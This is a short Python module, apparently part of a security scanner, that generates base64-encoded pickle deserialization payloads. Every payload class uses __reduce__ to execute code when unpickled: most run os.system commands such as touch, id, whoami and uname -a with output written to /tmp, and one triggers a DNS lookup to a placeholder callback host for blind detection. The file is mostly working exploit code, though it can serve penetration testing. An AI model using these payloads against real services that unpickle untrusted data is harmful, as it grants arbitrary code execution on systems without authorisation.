"""
pickle_payloads.py — pickle RCE payload generator (Project #48)
"""
import pickle
import base64
import os

def make_touch_payload(path="/tmp/pickle_rce_proof"):
    """Payload that creates a file via os.system."""
    class Exploit:
        def __reduce__(self):
            return (os.system, (f"touch {path}",))
    return base64.b64encode(pickle.dumps(Exploit())).decode()

def make_id_to_file_payload(path="/tmp/pickle_id.txt"):
    """Payload that writes `id` output to a file."""
    class Exploit:
        def __reduce__(self):
            return (os.system, (f"id > {path}",))
    return base64.b64encode(pickle.dumps(Exploit())).decode()

def make_whoami_payload(path="/tmp/pickle_whoami.txt"):
    class Exploit:
        def __reduce__(self):
            return (os.system, (f"whoami > {path}",))
    return base64.b64encode(pickle.dumps(Exploit())).decode()

def make_uname_payload(path="/tmp/pickle_uname.txt"):
    class Exploit:
        def __reduce__(self):
            return (os.system, (f"uname -a > {path}",))
    return base64.b64encode(pickle.dumps(Exploit())).decode()

def make_dns_callback_payload(host="127.0.0.1"):
    """Pickle payload that triggers a DNS lookup — for blind detection."""
    class Exploit:
        def __reduce__(self):
            import socket
            return (socket.gethostbyname, (f"callback-{host}.invalid",))
    return base64.b64encode(pickle.dumps(Exploit())).decode()

def score(issue_type):
    return {
        "pickle_detected": "INFO",
        "pickle_rce":      "CRITICAL",
    }.get(issue_type, "MEDIUM")
